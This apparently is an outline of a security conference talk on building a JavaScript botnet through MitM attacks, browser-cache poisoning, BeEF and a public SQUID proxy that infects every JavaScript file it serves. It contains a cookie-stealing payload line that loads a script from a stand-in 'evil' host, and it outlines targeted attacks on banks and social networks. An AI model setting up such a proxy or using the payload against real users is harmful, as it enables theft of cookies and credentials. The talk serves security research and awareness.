### Creating and Utilizing JavaScript Botnets

**Presented by: Chema Alonso & Manu “The Sur”**

#### Introduction
- **Objective:** To create a botnet using JavaScript.
- **Constraints:**
  - Limited resources (time, money, and technical expertise).
  - No zero-day exploits.
  - Not affiliated with major tech companies or law enforcement.

#### Man-in-the-Middle (MitM) Schemes
- **Intercept Communications:** 
  - Intercept traffic between the client and server.
  - Compromised channels lead to successful attacks.
- **Network Attacks:**
  - ARP Spoofing
  - Rogue DHCP(6)
  - ICMPv6 Spoofing
  - SLAAC Attacks
  - DNS Spoofing
  - Evil FOCA Rulez!

#### Man-in-the-Browser (MitB) Techniques
- **Browser Plugins and Add-ons:**
  - BHO (Browser Helper Objects)
  - Access to all data (passwords, code, etc.)
  - Banking trojans
  - Example: "A Russian in my IE"

#### JavaScript in the Middle
- **Cache Poisoning:**
  - Inject remote JavaScript into the browser cache.
  - Temporary nature of cache means infection can be cleaned by deleting the cache.
  - Cached content is used if not expired.
- **Access to:**
  - Cookies (non-HTTPOnly)
  - HTML Code
  - Form fields
  - URLs
  - Code execution

#### Google Analytics and Malware
- **Injecting JavaScript Code:**
  - Persistent XSS
  - Owning HTTP Servers
  - Network MitM attacks (WiFi, ARP Spoofing, IPv6, Memcache attacks)
  - Imagination

#### Framework for Owning Browser Cache
- **BeEF Project:**
  - Well-known framework for injecting JavaScript into clients.
  - Loads payloads from a Command and Control (C&C) server.

#### Creating a JavaScript Botnet
- **TOR Nodes:**
  - Not rocket science.
  - Avoid high-profile targets (e.g., The Pirate Bay, Amazon, Megaupload).
- **Configure SQUID Proxy:**
  - Activate URL rewrite program.
  - Set Apache No Expiration Policy.
  - Infect all JavaScript files.
  - Publish your proxy and let the internet do the magic.

#### Payload Examples
- **Cookie Stealing:**
  ```javascript
  document.write("<script src='http://evil/payload.js'></script>");
  ```
- **Form Fields Stealing:**
  ```javascript
  // Example code to steal form fields
  ```

#### Who Uses These Services?
- **Mafias:**
  - Nigerian Scammers
  - Predators
- **Dog Scammers**
- **Psychotics**
- **Anonymous Groups**
- **Hax0rs and Defacers**
- **Intranets and Pr0n Sites**

#### Targeted Attacks
- **Select the Target:**
  - Banks
  - Social Networks
  - Intranets
- **Analyze Loaded Files:**
  - Inject and load an infected file for the target on every web page the victim visits.
  - Profit from the attack.

#### Demonstration
- **Facebook Attack:**
  - Show how to inject a payload into Facebook.

#### Protections
- **Mitigation Strategies:**
  - Be cautious of MitM schemes.
  - Use proxies and TOR networks.
  - Clean all caches after use.
  - Understand that cache and VPNs are not foolproof.
